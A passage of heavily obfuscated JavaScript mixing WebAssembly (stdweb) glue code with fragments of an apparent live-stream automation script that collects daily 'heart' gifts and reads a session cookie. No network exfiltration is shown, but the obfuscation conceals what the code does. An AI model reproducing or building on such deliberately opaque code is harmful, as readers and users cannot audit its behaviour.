_0x280237=_0x44b0('296','\x57\x4c\x32\x31')['\x73\x70\x6c\x69\x74']('\x7c'),_0x1fa0b7=0x0;while(!![]){switch(_0x280237[_0x1fa0b7++]){case'\x30':if(_0x1585d3[_0x44b0('297','\x77\x35\x66\x31')](_0x27cdc3,0x0)){_0x50fda8=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('298','\x4b\x31\x4a\x29')](_0x27cdc3);_0x47ac7d[_0x44b0('299','\x4a\x51\x76\x65')][_0x44b0('29a','\x6e\x6f\x4f\x36')](_0x3abe68,_0x50fda8);}continue;case'\x31':_0x47ac7d['\x48\x45\x41\x50\x55\x33\x32'][_0x1585d3['\x74\x70\x61\x73\x65'](_0x2565e8+0x4,0x4)]=_0x27cdc3;continue;case'\x32':_0x47ac7d[_0x44b0('29b','\x66\x50\x57\x25')][_0x1585d3['\x70\x67\x42\x45\x75'](_0x2565e8,0x4)]=_0x50fda8;continue;case'\x33':var _0x27cdc3=_0x47ac7d[_0x44b0('29c','\x78\x70\x51\x66')][_0x44b0('29d','\x6c\x76\x37\x30')](_0x3abe68);continue;case'\x34':var _0x50fda8=0x0;continue;}break;}}else{return undefined;}};}_0x47ac7d[_0x44b0('1f8','\x6e\x6f\x4f\x36')][_0x44b0('29e','\x26\x68\x52\x65')]=function from_js(_0x2aa127,_0x93aebc){var _0x333020={'\x64\x44\x4c\x50\x53':_0x1585d3[_0x44b0('29f','\x46\x55\x43\x61')],'\x4f\x73\x7a\x4c\x44':function(_0x2023c0,_0x212835){return _0x2023c0/_0x212835;},'\x43\x4b\x44\x62\x66':function(_0x24b715,_0x2d8920){return _0x1585d3[_0x44b0('2a0','\x57\x4c\x32\x31')](_0x24b715,_0x2d8920);},'\x46\x70\x4f\x6f\x51':function(_0x3d85fc,_0x5c0670){return _0x3d85fc*_0x5c0670;},'\x4e\x67\x49\x79\x43':function(_0xaff645,_0x1440ed){return _0x1585d3['\x43\x64\x64\x45\x51'](_0xaff645,_0x1440ed);},'\x66\x4e\x59\x45\x6a':function(_0x35a76f,_0x5aac22){return _0x1585d3['\x6d\x4f\x66\x4b\x77'](_0x35a76f,_0x5aac22);}};var _0x2af43e=Object[_0x44b0('2a1','\x30\x64\x6a\x29')][_0x44b0('2a2','\x6d\x4e\x33\x48')][_0x44b0('2a3','\x39\x7a\x62\x29')](_0x93aebc);if(_0x1585d3[_0x44b0('2a4','\x47\x57\x24\x42')](_0x2af43e,_0x1585d3['\x56\x59\x6b\x71\x62'])){if(_0x1585d3[_0x44b0('2a5','\x37\x6b\x28\x50')]===_0x1585d3[_0x44b0('2a6','\x4a\x51\x76\x65')]){var _0x347e84=_0x1585d3[_0x44b0('2a7','\x45\x43\x35\x64')][_0x44b0('2a8','\x58\x47\x44\x4e')]('\x7c'),_0x565b7f=0x0;while(!![]){switch(_0x347e84[_0x565b7f++]){case'\x30':var _0xaec6d5=0x0;continue;case'\x31':if(_0x158daa>0x0){_0xaec6d5=_0x47ac7d[_0x44b0('2a9','\x42\x29\x55\x55')][_0x44b0('2aa','\x6e\x6f\x4f\x36')](_0x158daa);_0x47ac7d['\x48\x45\x41\x50\x55\x38'][_0x44b0('2ab','\x58\x47\x44\x4e')](_0x1f27e4,_0xaec6d5);}continue;case'\x32':_0x47ac7d[_0x44b0('2ac','\x30\x78\x36\x55')][_0x1585d3['\x70\x67\x42\x45\x75'](_0x2aa127,0x4)]=_0xaec6d5;continue;case'\x33':var _0x1f27e4=_0xff934[_0x44b0('2ad','\x4b\x38\x4e\x4f')](_0x93aebc);continue;case'\x34':var _0x158daa=_0x1f27e4[_0x44b0('2ae','\x57\x4c\x32\x31')];continue;case'\x35':_0x47ac7d[_0x44b0('2ac','\x30\x78\x36\x55')][_0x1585d3[_0x44b0('2af','\x69\x6b\x5e\x48')](_0x2aa127+0x4,0x4)]=_0x158daa;continue;}break;}}else{_0x47ac7d[_0x44b0('2b0','\x58\x47\x44\x4e')][_0x1585d3['\x46\x64\x56\x46\x79'](_0x2aa127,0xc)]=0x4;_0x47ac7d[_0x44b0('2b1','\x26\x68\x52\x65')][_0x44b0('2b2','\x5a\x55\x6a\x6c')](_0x2aa127,_0x93aebc);}}else if(_0x1585d3[_0x44b0('2b3','\x69\x6b\x5e\x48')](_0x2af43e,_0x1585d3[_0x44b0('2b4','\x78\x70\x51\x66')])){if(_0x1585d3[_0x44b0('2b5','\x66\x50\x57\x25')](_0x1585d3['\x59\x57\x64\x6f\x63'],_0x1585d3[_0x44b0('2b6','\x45\x43\x35\x64')])){if(HeartGift['\x70\x72\x6f\x63\x65\x73\x73']){console['\x6c\x6f\x67']('\u5f53\u65e5\u5c0f\u5fc3\u5fc3\u6536\u96c6\u5b8c\u6bd5');HeartGift[_0x44b0('2b7','\x77\x59\x64\x62')]=![];runTomorrow(HeartGift[_0x44b0('2b8','\x66\x50\x57\x25')]);}}else{if(_0x1585d3[_0x44b0('2b9','\x77\x59\x64\x62')](_0x93aebc,_0x1585d3[_0x44b0('2ba','\x50\x32\x36\x69')](_0x93aebc,0x0))){if(_0x1585d3[_0x44b0('2bb','\x45\x25\x78\x72')](_0x1585d3[_0x44b0('2bc','\x58\x47\x44\x4e')],_0x44b0('2bd','\x77\x59\x64\x62'))){var _0x6ad804=_0x333020[_0x44b0('2be','\x65\x4d\x52\x45')][_0x44b0('2bf','\x4b\x61\x72\x62')]('\x7c'),_0x2324ce=0x0;while(!![]){switch(_0x6ad804[_0x2324ce++]){case'\x30':var _0x54c8f9=_0x47ac7d[_0x44b0('2c0','\x6c\x76\x37\x30')][_0x333020[_0x44b0('2c1','\x78\x70\x51\x66')](_0x333020[_0x44b0('2c2','\x4a\x51\x76\x65')](key_array_pointer,0x4)+_0x333020[_0x44b0('2c3','\x66\x50\x57\x25')](i,0x8),0x4)];continue;case'\x31':var _0x34f097=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x74\x6f\x5f\x6a\x73\x5f\x73\x74\x72\x69\x6e\x67'](_0x5d7e7d,_0x54c8f9);continue;case'\x32':var _0x5d7e7d=_0x47ac7d['\x48\x45\x41\x50\x55\x33\x32'][_0x333020['\x4f\x73\x7a\x4c\x44'](key_array_pointer+_0x333020[_0x44b0('2c4','\x50\x32\x36\x69')](i,0x8),0x4)];continue;case'\x33':var _0x3d9ea5=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('2c5','\x29\x5e\x41\x62')](_0x333020[_0x44b0('2c6','\x78\x70\x51\x66')](value_array_pointer,_0x333020['\x66\x4e\x59\x45\x6a'](i,0x10)));continue;case'\x34':output[_0x34f097]=_0x3d9ea5;continue;}break;}}else{_0x47ac7d['\x48\x45\x41\x50\x55\x38'][_0x1585d3['\x46\x64\x56\x46\x79'](_0x2aa127,0xc)]=0x2;_0x47ac7d[_0x44b0('2c7','\x40\x64\x71\x6b')][_0x1585d3['\x78\x48\x41\x6e\x71'](_0x2aa127,0x4)]=_0x93aebc;}}else{_0x47ac7d['\x48\x45\x41\x50\x55\x38'][_0x1585d3['\x54\x6d\x45\x52\x56'](_0x2aa127,0xc)]=0x3;_0x47ac7d[_0x44b0('2c8','\x42\x29\x55\x55')][_0x1585d3['\x48\x49\x44\x65\x63'](_0x2aa127,0x8)]=_0x93aebc;}}}else if(_0x1585d3['\x48\x6c\x46\x4b\x4f'](_0x93aebc,null)){_0x47ac7d['\x48\x45\x41\x50\x55\x38'][_0x1585d3[_0x44b0('2c9','\x62\x55\x70\x6a')](_0x2aa127,0xc)]=0x1;}else if(_0x1585d3['\x55\x5a\x4f\x58\x52'](_0x93aebc,undefined)){if(_0x1585d3[_0x44b0('2ca','\x6e\x6f\x4f\x36')](_0x1585d3['\x45\x43\x78\x68\x72'],_0x1585d3[_0x44b0('2cb','\x6d\x4e\x33\x48')])){_0x47ac7d[_0x44b0('2cc','\x47\x50\x4f\x53')][_0x1585d3['\x43\x4b\x68\x66\x57'](_0x2aa127,0xc)]=0x0;}else{return t[_0x44b0('2cd','\x29\x67\x5b\x49')];}}else if(_0x1585d3[_0x44b0('2ce','\x37\x6b\x28\x50')](_0x93aebc,![])){_0x47ac7d[_0x44b0('2cf','\x30\x5a\x53\x4e')][_0x1585d3['\x59\x65\x74\x47\x67'](_0x2aa127,0xc)]=0x5;}else if(_0x1585d3[_0x44b0('2ce','\x37\x6b\x28\x50')](_0x93aebc,!![])){if(_0x1585d3['\x42\x53\x68\x66\x79'](_0x1585d3[_0x44b0('2d0','\x37\x4f\x5e\x66')],_0x44b0('2d1','\x6f\x2a\x51\x6d'))){_0x47ac7d[_0x44b0('26b','\x4b\x38\x4e\x4f')][_0x44b0('2d2','\x26\x68\x52\x65')](t);}else{_0x47ac7d['\x48\x45\x41\x50\x55\x38'][_0x2aa127+0xc]=0x6;}}else if(_0x1585d3[_0x44b0('2d3','\x48\x6c\x29\x64')](_0x2af43e,'\x5b\x6f\x62\x6a\x65\x63\x74\x20\x53\x79\x6d\x62\x6f\x6c\x5d')){if(_0x1585d3[_0x44b0('2d4','\x77\x59\x64\x62')](_0x44b0('2d5','\x6d\x4e\x33\x48'),_0x1585d3['\x74\x6f\x6b\x50\x6a'])){return window[_0x44b0('149','\x29\x67\x5b\x49')]['\x69\x6e\x73\x74\x61\x6e\x74\x69\x61\x74\x65'](t,n[_0x44b0('2d6','\x6f\x23\x56\x5b')]);}else{var _0x588c28=_0x47ac7d[_0x44b0('2d7','\x6d\x4e\x33\x48')][_0x44b0('2d8','\x50\x32\x36\x69')](_0x93aebc);_0x47ac7d[_0x44b0('28f','\x66\x50\x57\x25')][_0x2aa127+0xc]=0xf;_0x47ac7d[_0x44b0('2d9','\x29\x5e\x41\x62')][_0x1585d3['\x75\x49\x64\x48\x6a'](_0x2aa127,0x4)]=_0x588c28;}}else{var _0x2351f8=_0x47ac7d[_0x44b0('116','\x40\x64\x71\x6b')]['\x61\x63\x71\x75\x69\x72\x65\x5f\x72\x75\x73\x74\x5f\x72\x65\x66\x65\x72\x65\x6e\x63\x65'](_0x93aebc);_0x47ac7d[_0x44b0('2cc','\x47\x50\x4f\x53')][_0x2aa127+0xc]=0x9;_0x47ac7d[_0x44b0('221','\x42\x29\x55\x55')][_0x1585d3[_0x44b0('2da','\x4a\x51\x76\x65')](_0x2aa127,0x4)]=_0x2351f8;}};var _0x5636d9=_0x1585d3[_0x44b0('2db','\x47\x50\x4f\x53')](typeof TextDecoder,_0x1585d3[_0x44b0('2dc','\x58\x47\x44\x4e')])?new TextDecoder(_0x44b0('2dd','\x6c\x76\x37\x30')):typeof util===_0x44b0('2de','\x6c\x76\x37\x30')&&util&&_0x1585d3[_0x44b0('2df','\x4b\x61\x72\x62')](typeof util[_0x44b0('2e0','\x2a\x52\x4c\x7a')],_0x1585d3['\x63\x66\x55\x4d\x6b'])?new util[(_0x44b0('2e1','\x69\x6b\x5e\x48'))](_0x1585d3[_0x44b0('2e2','\x73\x66\x76\x75')]):null;if(_0x1585d3[_0x44b0('2e3','\x52\x33\x4e\x68')](_0x5636d9,null)){if(_0x1585d3[_0x44b0('2e4','\x65\x4d\x52\x45')](_0x1585d3['\x55\x41\x70\x77\x77'],_0x1585d3[_0x44b0('2e5','\x77\x59\x64\x62')])){var _0x2e1c57=_0x47ac7d[_0x44b0('2ac','\x30\x78\x36\x55')][_0x1585d3[_0x44b0('2da','\x4a\x51\x76\x65')](address,0x4)];var _0x29b9bb=_0x47ac7d['\x48\x45\x41\x50\x55\x33\x32'][_0x1585d3[_0x44b0('2e6','\x78\x70\x51\x66')](address+0x4,0x4)];return _0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('2e7','\x5a\x55\x6a\x6c')](_0x2e1c57,_0x29b9bb);}else{_0x47ac7d[_0x44b0('1d6','\x39\x7a\x62\x29')]['\x74\x6f\x5f\x6a\x73\x5f\x73\x74\x72\x69\x6e\x67']=function to_js_string(_0x5975c6,_0x2b74c5){var _0x32e895={'\x67\x51\x75\x61\x72':_0x44b0('2e8','\x58\x47\x44\x4e'),'\x43\x45\x57\x4a\x67':function(_0x5ec060,_0x15086b){return _0x1585d3[_0x44b0('2e9','\x46\x55\x43\x61')](_0x5ec060,_0x15086b);},'\x54\x43\x55\x74\x6e':function(_0x5adbb1,_0x2ebd78){return _0x5adbb1|_0x2ebd78;},'\x76\x69\x64\x4f\x69':function(_0x22d008,_0x48666a){return _0x1585d3[_0x44b0('2ea','\x59\x75\x55\x68')](_0x22d008,_0x48666a);},'\x43\x6e\x7a\x57\x58':function(_0x226e11,_0x84ef4){return _0x1585d3[_0x44b0('2eb','\x59\x75\x55\x68')](_0x226e11,_0x84ef4);},'\x6f\x53\x6e\x66\x72':function(_0x31580b,_0x10cf0f){return _0x1585d3[_0x44b0('2ec','\x35\x75\x5b\x26')](_0x31580b,_0x10cf0f);},'\x6a\x69\x6b\x59\x75':function(_0x491782,_0x2a75cc){return _0x1585d3[_0x44b0('2ed','\x65\x4d\x52\x45')](_0x491782,_0x2a75cc);},'\x72\x41\x59\x68\x43':function(_0x1ec901,_0x117b6d){return _0x1585d3['\x4b\x45\x64\x45\x77'](_0x1ec901,_0x117b6d);}};if(_0x1585d3['\x6d\x79\x6b\x4e\x59'](_0x44b0('2ee','\x46\x55\x43\x61'),_0x1585d3['\x4d\x64\x6e\x6c\x59'])){return _0x5636d9['\x64\x65\x63\x6f\x64\x65'](_0x47ac7d['\x48\x45\x41\x50\x55\x38']['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x5975c6,_0x1585d3[_0x44b0('2ef','\x40\x64\x71\x6b')](_0x5975c6,_0x2b74c5)));}else{var _0x2477d4=_0x32e895[_0x44b0('2f0','\x2a\x52\x4c\x7a')]['\x73\x70\x6c\x69\x74']('\x7c'),_0x24c4ef=0x0;while(!![]){switch(_0x2477d4[_0x24c4ef++]){case'\x30':_0x354543[addr++]=_0x32e895[_0x44b0('2f1','\x77\x59\x64\x62')](0x80,u>>0xc&0x3f);continue;case'\x31':_0x354543[addr++]=_0x32e895[_0x44b0('2f2','\x4a\x51\x76\x65')](0x80,_0x32e895[_0x44b0('2f3','\x2a\x52\x4c\x7a')](u,0x12)&0x3f);continue;case'\x32':_0x354543[addr++]=0xf8|_0x32e895['\x43\x6e\x7a\x57\x58'](u,0x18);continue;case'\x33':_0x354543[addr++]=_0x32e895[_0x44b0('2f4','\x6f\x23\x56\x5b')](0x80,_0x32e895[_0x44b0('2f5','\x30\x5a\x53\x4e')](_0x32e895[_0x44b0('2f6','\x4b\x6e\x35\x43')](u,0x6),0x3f));continue;case'\x34':_0x354543[addr++]=_0x32e895[_0x44b0('2f7','\x35\x75\x5b\x26')](0x80,_0x32e895[_0x44b0('2f8','\x4a\x51\x76\x65')](u,0x3f));continue;}break;}}};}}else{_0x47ac7d[_0x44b0('2f9','\x30\x64\x6a\x29')][_0x44b0('2fa','\x4b\x6e\x35\x43')]=function to_js_string(_0x44ace7,_0x287083){var _0x5c6560=_0x1585d3['\x4e\x63\x44\x66\x76'][_0x44b0('2fb','\x42\x29\x55\x55')]('\x7c'),_0x5559a8=0x0;while(!![]){switch(_0x5c6560[_0x5559a8++]){case'\x30':var _0x5bf04a=_0x47ac7d[_0x44b0('2cf','\x30\x5a\x53\x4e')];continue;case'\x31':var _0xed9987=_0x1585d3['\x48\x6b\x76\x41\x54'](_0x44ace7|0x0,_0x287083|0x0);continue;case'\x32':_0x44ace7=_0x44ace7|0x0;continue;case'\x33':_0x287083=_0x287083|0x0;continue;case'\x34':var _0x45b290='';continue;case'\x35':while(_0x1585d3['\x6e\x57\x65\x77\x76'](_0x44ace7,_0xed9987)){if(_0x1585d3[_0x44b0('2fc','\x29\x5e\x41\x62')](_0x1585d3[_0x44b0('2fd','\x35\x75\x5b\x26')],_0x1585d3[_0x44b0('2fe','\x50\x32\x36\x69')])){_0x47ac7d[_0x44b0('2ff','\x78\x57\x72\x21')][address+0xc]=0x0;}else{var _0x525e8c=_0x5bf04a[_0x44ace7++];if(_0x525e8c<0x80){_0x45b290+=String[_0x44b0('300','\x6c\x76\x37\x30')](_0x525e8c);continue;}var _0x236d6d=_0x1585d3[_0x44b0('301','\x30\x64\x6a\x29')](_0x525e8c,_0x1585d3[_0x44b0('302','\x6c\x76\x37\x30')](0x7f,0x2));var _0xf8b5a5=0x0;if(_0x1585d3[_0x44b0('303','\x4b\x38\x4e\x4f')](_0x44ace7,_0xed9987)){if(_0x1585d3[_0x44b0('304','\x4b\x61\x72\x62')](_0x1585d3[_0x44b0('305','\x4f\x73\x32\x61')],'\x50\x7a\x72\x7a\x6a')){return _0x47ac7d['\x77\x65\x62\x5f\x74\x61\x62\x6c\x65'][_0x44b0('306','\x37\x6b\x28\x50')](ptr)[_0x44b0('307','\x6f\x2a\x51\x6d')](null,args);}else{_0xf8b5a5=_0x5bf04a[_0x44ace7++];}}var _0x5d90f3=_0x1585d3[_0x44b0('308','\x65\x4d\x52\x45')](_0x1585d3['\x54\x75\x52\x45\x49'](_0x236d6d,0x6),_0xf8b5a5&0x3f);if(_0x525e8c>=0xe0){if(_0x1585d3[_0x44b0('309','\x57\x4c\x32\x31')](_0x1585d3['\x72\x57\x6c\x67\x64'],_0x1585d3[_0x44b0('30a','\x59\x75\x55\x68')])){return{'\x65\x72\x72\x6f\x72':e,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}else{var _0x5114c8=0x0;if(_0x1585d3[_0x44b0('30b','\x37\x6b\x28\x50')](_0x44ace7,_0xed9987)){_0x5114c8=_0x5bf04a[_0x44ace7++];}var _0x4eb163=_0x1585d3[_0x44b0('30c','\x29\x67\x5b\x49')]((_0xf8b5a5&0x3f)<<0x6,_0x1585d3[_0x44b0('30d','\x29\x5e\x41\x62')](_0x5114c8,0x3f));_0x5d90f3=_0x1585d3[_0x44b0('30e','\x59\x75\x55\x68')](_0x1585d3[_0x44b0('30f','\x52\x33\x4e\x68')](_0x236d6d,0xc),_0x4eb163);if(_0x1585d3[_0x44b0('310','\x47\x57\x24\x42')](_0x525e8c,0xf0)){if(_0x1585d3['\x41\x6d\x52\x75\x6f'](_0x1585d3[_0x44b0('311','\x40\x64\x71\x6b')],_0x1585d3[_0x44b0('312','\x39\x7a\x62\x29')])){block_count++;}else{var _0x456dfe=_0x1585d3[_0x44b0('313','\x57\x4c\x32\x31')][_0x44b0('314','\x4f\x78\x6c\x4b')]('\x7c'),_0xe727f1=0x0;while(!![]){switch(_0x456dfe[_0xe727f1++]){case'\x30':_0x5d90f3=_0x1585d3[_0x44b0('315','\x37\x6b\x28\x50')](_0x1585d3[_0x44b0('316','\x2a\x52\x4c\x7a')](_0x1585d3[_0x44b0('317','\x69\x6b\x5e\x48')](_0x236d6d,0x7),0x12),_0x1585d3[_0x44b0('318','\x77\x59\x64\x62')](_0x4eb163,0x6)|_0x2e2584&0x3f);continue;case'\x31':_0x45b290+=String[_0x44b0('319','\x58\x47\x44\x4e')](_0x1585d3[_0x44b0('31a','\x4f\x78\x6c\x4b')](0xd7c0,_0x5d90f3>>0xa));continue;case'\x32':_0x5d90f3=_0x1585d3[_0x44b0('31b','\x35\x75\x5b\x26')](0xdc00,_0x1585d3[_0x44b0('31c','\x6d\x4e\x33\x48')](_0x5d90f3,0x3ff));continue;case'\x33':if(_0x44ace7<_0xed9987){_0x2e2584=_0x5bf04a[_0x44ace7++];}continue;case'\x34':var _0x2e2584=0x0;continue;}break;}}}}}_0x45b290+=String[_0x44b0('31d','\x45\x43\x35\x64')](_0x5d90f3);continue;}}continue;case'\x36':return _0x45b290;}break;}};}_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x69\x64\x5f\x74\x6f\x5f\x72\x65\x66\x5f\x6d\x61\x70']={};_0x47ac7d[_0x44b0('240','\x5a\x55\x6a\x6c')]['\x69\x64\x5f\x74\x6f\x5f\x72\x65\x66\x63\x6f\x75\x6e\x74\x5f\x6d\x61\x70']={};_0x47ac7d[_0x44b0('c9','\x77\x59\x64\x62')]['\x72\x65\x66\x5f\x74\x6f\x5f\x69\x64\x5f\x6d\x61\x70']=new WeakMap();_0x47ac7d[_0x44b0('117','\x69\x71\x55\x67')]['\x72\x65\x66\x5f\x74\x6f\x5f\x69\x64\x5f\x6d\x61\x70\x5f\x66\x61\x6c\x6c\x62\x61\x63\x6b']=new Map();_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('31e','\x52\x33\x4e\x68')]=0x1;_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('31f','\x48\x6c\x29\x64')]={};_0x47ac7d[_0x44b0('146','\x47\x50\x4f\x53')]['\x6c\x61\x73\x74\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65\x5f\x69\x64']=0x1;_0x47ac7d[_0x44b0('320','\x57\x76\x6e\x6b')]['\x61\x63\x71\x75\x69\x72\x65\x5f\x72\x75\x73\x74\x5f\x72\x65\x66\x65\x72\x65\x6e\x63\x65']=function(_0x4fb16c){var _0x39495a={'\x4a\x59\x5a\x70\x75':_0x1585d3[_0x44b0('321','\x37\x6b\x28\x50')]};if(_0x1585d3['\x43\x79\x63\x61\x46'](_0x1585d3[_0x44b0('322','\x4f\x78\x6c\x4b')],_0x1585d3['\x51\x78\x51\x70\x4e'])){if(_0x4fb16c===undefined||_0x1585d3[_0x44b0('323','\x50\x32\x36\x69')](_0x4fb16c,null)){if(_0x1585d3[_0x44b0('324','\x42\x29\x55\x55')](_0x1585d3[_0x44b0('325','\x52\x33\x4e\x68')],_0x1585d3['\x44\x69\x61\x58\x75'])){_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('326','\x6c\x76\x37\x30')](_0x1585d3[_0x44b0('327','\x77\x35\x66\x31')](pointer,i*0x10),value[i]);}else{return 0x0;}}var _0x43e621=_0x47ac7d[_0x44b0('146','\x47\x50\x4f\x53')][_0x44b0('328','\x62\x55\x70\x6a')];var _0x310c03=_0x47ac7d[_0x44b0('1d6','\x39\x7a\x62\x29')]['\x69\x64\x5f\x74\x6f\x5f\x72\x65\x66\x5f\x6d\x61\x70'];var _0x434800=_0x47ac7d[_0x44b0('329','\x57\x4c\x32\x31')][_0x44b0('32a','\x52\x33\x4e\x68')];var _0x3bf153=_0x47ac7d[_0x44b0('24d','\x4b\x6e\x35\x43')][_0x44b0('32b','\x48\x6c\x29\x64')];var _0x4df0cd=_0x434800[_0x44b0('306','\x37\x6b\x28\x50')](_0x4fb16c);if(_0x1585d3[_0x44b0('32c','\x4a\x51\x76\x65')](_0x4df0cd,undefined)){_0x4df0cd=_0x3bf153[_0x44b0('32d','\x37\x4f\x5e\x66')](_0x4fb16c);}if(_0x4df0cd===undefined){_0x4df0cd=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('32e','\x51\x25\x5d\x28')]++;try{if(_0x1585d3[_0x44b0('32f','\x58\x47\x44\x4e')]===_0x1585d3['\x78\x4b\x6f\x50\x44']){_0x434800[_0x44b0('330','\x37\x4f\x5e\x66')](_0x4fb16c,_0x4df0cd);}else{++len;}}catch(_0x380994){_0x3bf153[_0x44b0('331','\x57\x76\x6e\x6b')](_0x4fb16c,_0x4df0cd);}}if(_0x1585d3[_0x44b0('332','\x45\x43\x35\x64')](_0x4df0cd,_0x310c03)){_0x43e621[_0x4df0cd]++;}else{if(_0x1585d3[_0x44b0('32c','\x4a\x51\x76\x65')](_0x1585d3['\x56\x65\x4e\x48\x71'],_0x44b0('333','\x47\x50\x4f\x53'))){_0x310c03[_0x4df0cd]=_0x4fb16c;_0x43e621[_0x4df0cd]=0x1;}else{throw console['\x6c\x6f\x67'](_0x39495a['\x4a\x59\x5a\x70\x75'],t),t;}}return _0x4df0cd;}else{this[_0x44b0('334','\x26\x68\x52\x65')]=![];}};_0x47ac7d[_0x44b0('329','\x57\x4c\x32\x31')]['\x61\x63\x71\x75\x69\x72\x65\x5f\x6a\x73\x5f\x72\x65\x66\x65\x72\x65\x6e\x63\x65']=function(_0x102db1){return _0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x69\x64\x5f\x74\x6f\x5f\x72\x65\x66\x5f\x6d\x61\x70'][_0x102db1];};_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x69\x6e\x63\x72\x65\x6d\x65\x6e\x74\x5f\x72\x65\x66\x63\x6f\x75\x6e\x74']=function(_0x505db2){if(_0x1585d3[_0x44b0('335','\x30\x5a\x53\x4e')](_0x1585d3['\x64\x44\x49\x79\x70'],_0x1585d3[_0x44b0('336','\x47\x57\x24\x42')])){_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('337','\x77\x35\x66\x31')][_0x505db2]++;}else{r=_0x47ac7d[_0x44b0('338','\x65\x4d\x52\x45')]['\x74\x6f\x5f\x6a\x73'](r),_0x47ac7d[_0x44b0('146','\x47\x50\x4f\x53')][_0x44b0('339','\x4a\x51\x76\x65')](t,function(){try{return{'\x76\x61\x6c\x75\x65':r[_0x44b0('33a','\x30\x64\x6a\x29')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x23d89b){return{'\x65\x72\x72\x6f\x72':_0x23d89b,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}());}};_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x64\x65\x63\x72\x65\x6d\x65\x6e\x74\x5f\x72\x65\x66\x63\x6f\x75\x6e\x74']=function(_0x1f4193){var _0x4a1838=_0x47ac7d[_0x44b0('23a','\x50\x32\x36\x69')][_0x44b0('33b','\x6f\x2a\x51\x6d')];if(_0x1585d3[_0x44b0('33c','\x57\x76\x6e\x6b')](0x0,--_0x4a1838[_0x1f4193])){if(_0x1585d3[_0x44b0('33d','\x52\x33\x4e\x68')](_0x1585d3[_0x44b0('33e','\x57\x4c\x32\x31')],_0x1585d3[_0x44b0('33f','\x59\x75\x55\x68')])){return![];}else{var _0x416dc3=_0x1585d3[_0x44b0('340','\x6d\x4e\x33\x48')]['\x73\x70\x6c\x69\x74']('\x7c'),_0x25ca34=0x0;while(!![]){switch(_0x416dc3[_0x25ca34++]){case'\x30':var _0x15eb92=_0x47ac7d[_0x44b0('246','\x66\x50\x57\x25')][_0x44b0('341','\x69\x6b\x5e\x48')];continue;case'\x31':var _0x1193d5=_0x15eb92[_0x1f4193];continue;case'\x32':delete _0x15eb92[_0x1f4193];continue;case'\x33':delete _0x4a1838[_0x1f4193];continue;case'\x34':var _0x44966d=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x72\x65\x66\x5f\x74\x6f\x5f\x69\x64\x5f\x6d\x61\x70\x5f\x66\x61\x6c\x6c\x62\x61\x63\x6b'];continue;case'\x35':_0x44966d[_0x44b0('342','\x73\x66\x76\x75')](_0x1193d5);continue;}break;}}}};_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('343','\x62\x55\x70\x6a')]=function(_0x4cb9b0){if(_0x1585d3['\x46\x49\x48\x62\x52'](_0x1585d3[_0x44b0('344','\x26\x68\x52\x65')],_0x1585d3[_0x44b0('345','\x6f\x23\x56\x5b')])){var _0x322ab9=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x6c\x61\x73\x74\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65\x5f\x69\x64']++;_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x69\x64\x5f\x74\x6f\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65\x5f\x6d\x61\x70'][_0x322ab9]=_0x4cb9b0;return _0x322ab9;}else{var _0x5a7b19=_0x1585d3['\x76\x59\x7a\x4e\x64']['\x73\x70\x6c\x69\x74']('\x7c'),_0x1880b1=0x0;while(!![]){switch(_0x5a7b19[_0x1880b1++]){case'\x30':this[_0x44b0('346','\x6d\x4e\x33\x48')]=info[_0x44b0('347','\x4b\x61\x72\x62')];continue;case'\x31':this[_0x44b0('348','\x29\x67\x5b\x49')]=_0x1585d3['\x6d\x6f\x5a\x5a\x41'](getCookie,_0x44b0('349','\x35\x75\x5b\x26'));continue;case'\x32':this[_0x44b0('34a','\x46\x55\x43\x61')]=info['\x72\x6f\x6f\x6d\x5f\x69\x64'];continue;case'\x33':this['\x75\x75\x69\x64']=UUID();continue;case'\x34':this[_0x44b0('34b','\x2a\x52\x4c\x7a')]=0x0;continue;case'\x35':this['\x70\x61\x72\x65\x6e\x74\x5f\x61\x72\x65\x61\x5f\x69\x64']=info['\x70\x61\x72\x65\x6e\x74\x5f\x61\x72\x65\x61\x5f\x69\x64'];continue;case'\x36':this[_0x44b0('34c','\x30\x78\x36\x55')]=medal;continue;case'\x37':;continue;case'\x38':this[_0x44b0('34d','\x73\x66\x76\x75')]=info;continue;case'\x39':this[_0x44b0('34e','\x40\x64\x71\x6b')]=0x0;continue;case'\x31\x30':this[_0x44b0('34f','\x51\x25\x5d\x28')]=0x0;continue;case'\x31\x31':this[_0x44b0('350','\x6f\x2a\x51\x6d')]=new 